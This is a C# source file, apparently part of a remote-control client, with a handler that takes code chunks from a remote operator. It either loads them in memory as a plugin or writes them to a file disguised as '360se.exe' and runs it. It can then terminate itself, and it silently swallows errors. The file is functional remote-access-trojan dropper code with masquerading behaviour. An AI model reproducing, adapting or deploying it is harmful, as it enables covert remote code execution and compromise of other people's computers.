using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Plugin;

namespace RemoteControl.Client.Handlers
{
    class RequestExecCodeHandler : AbstractRequestHandler
    {
        private Dictionary<string, List<byte>> codePluginDic = new Dictionary<string, List<byte>>();
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST)
            {
                var req = reqObj as RequestTransportExecCode;
                if (!codePluginDic.ContainsKey(req.ID))
                {
                    codePluginDic.Add(req.ID, new List<byte>());
                }
                codePluginDic[req.ID].AddRange(req.Data);
            }
            else if (reqType == ePacketType.PACKET_RUN_EXEC_CODE_REQUEST)
            {
                var req = reqObj as RequestRunExecCode;
                RunTaskThread(() => Run(req));
            }
        }

        private void Run(RequestRunExecCode req)
        {
            try
            {
                Console.WriteLine("请求ID:" + req.ID);
                if (codePluginDic.ContainsKey(req.ID))
                {
                    if (req.Mode == eExecMode.ExecByPlugin)
                    {
                        byte[] data = codePluginDic[req.ID].ToArray();
                        Console.WriteLine("数据长度：" + data.Length);
                        PluginLoader.LoadPlugin(data, null);
                        codePluginDic.Remove(req.ID);
                    }
                    else if (req.Mode == eExecMode.ExecByFile)
                    {
                        if (req.FileArguments == null)
                            req.FileArguments = string.Empty;
                        // 释放文件
                        byte[] data = codePluginDic[req.ID].ToArray();
                        string tempFile = ResUtil.WriteToRandomFile(data, "360se.exe");
                        // 启动新程序
                        Thread t = ProcessUtil.RunByCmdStart(tempFile, req.FileArguments, true);
                        t.Join();
                        if (req.IsKillMySelf)
                        {
                            // 结束当前进程
                            if (OnFireQuit!=null)
                            {
                                OnFireQuit(null, null); 
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("请求ID不存在:" + req.ID);
                }
            }
            catch (Exception ex)
            {
            }     
        }
    }
}
